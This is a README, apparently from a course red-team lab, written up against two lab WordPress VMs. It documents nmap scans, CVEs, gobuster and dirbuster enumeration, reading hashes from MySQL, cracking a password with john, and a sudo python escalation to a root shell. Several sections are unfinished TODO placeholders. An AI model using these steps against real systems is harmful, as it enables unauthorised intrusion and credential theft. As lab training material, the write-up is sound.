# WordPressRedTeam_BlueTeam

The network depicted below was used to test exploits and determine vulnerabilities within the WordPress servers.
![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/Topology%20Final%20Project.png)
Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

# Exposed Services

The nmap scan outlined below identifies the potential points of entry:

nmap $ nmap -sC -sV 192.168.1.110

Target 1:
- Port 22 / SSH
- Port 80 / http
- Port 111 / rpcbind

![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/nmap%20vm1.png)

nmap $ nmap -sC -sV 192.168.1.115

Target 2:
- Port 22 / SSH
- Port 80 / http
- Port 111 / rpcbind

![TODO: Update the path with the name of your diagram](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/NMAP%20final%20Project.png)

# Critical Vulnerabilities

The following vulnerabilities were identified on each target:

Target 1
- CVE-2019-12215 Full Path Disclosure (192.268.1.110/service.html)
- CVE-2019-15653 html password disclosure - The password hash is viewable in plaintext (192.168.1.110/service.html)
- Wpscan exposed username which allowed brute force of password information.  User access to the wp-config.php file via nano.  This exposed the root user and password.

Target 2
- CVE-2019-12215 Full Path Disclosure (192.168.1.115/vendor/PATH)
- CVE-2015-8476 Php mailer (192.168.1.115/vendor/PHPMailerAutoload.php)

# Exploitation

The Red Team was able to penetrate both Target 1 and Target 2 and retrieve the following confidential data:

Target 1
- flag1.txt: 9bbcb33e11b80be759c4e844862482
Exploit Used: 
! [TODO: Identify the exploit used.]
! [TODO: Include the command run.]
- flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c
Exploit Used
![TODO:] gobuster - exposed directory path (flag was discovered at 192.168.1.110/vendor/PATH)
![TODO:Update with output and command](https://github.com/joshgarlandreese/WordPressRedTeam_BlueTeam/blob/master/gobuster%20vm1.png)gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -e -u http://192.168.1.110
- flag3.txt: afc01ab56b50591e7dccf93122770cd2
Exploit Used
![TODO:] exposed root password and then uncovered hashes via mysql
![TODO:] mysql -u root -p wordpress -> show databases; -> select * from wp_posts;
- flag4.txt: 715dea6c055b9fe3337544932f2941ce
Exploit Used
- john hash.txt to translate steven’s hash into password “pink84” -> logged in with steven’s credentials and then ran bin/bash command  to gain root
- ssh steven@192.168.1.110 -> sudo /usr/bin/python -> import os -> os.system(‘ /bin/bash’) -> ls -> cat flag4.txt

Target 2
- flag1.txt: a2c1f66d2b8051bd3a5874b5b6e43e21
Exploit Used 
![TODO:] gobuster - exposed directory path (flag was discovered at 192.168.1.115/vendor/PATH)
![TODO:] gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -e -u http://192.168.1.115
- flag2.txt: 
Exploit Used
![TODO:] Identify the exploit used.
![TODO:] Include the command run.
- flag3.txt:  a0f568aa9de277887f377887f37730d71520d9b
Exploit Used
![TODO:] dirbuster - exposed directory path (flag was discovered at 192.168.1.115/wordpress/wp-content/uploads/2018/11/)
![TODO:] dirbuster -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -u http://192.168.1.115
flag4.txt: 
Exploit Used
![TODO:] Identify the exploit used.
![TODO:] Include the command run.

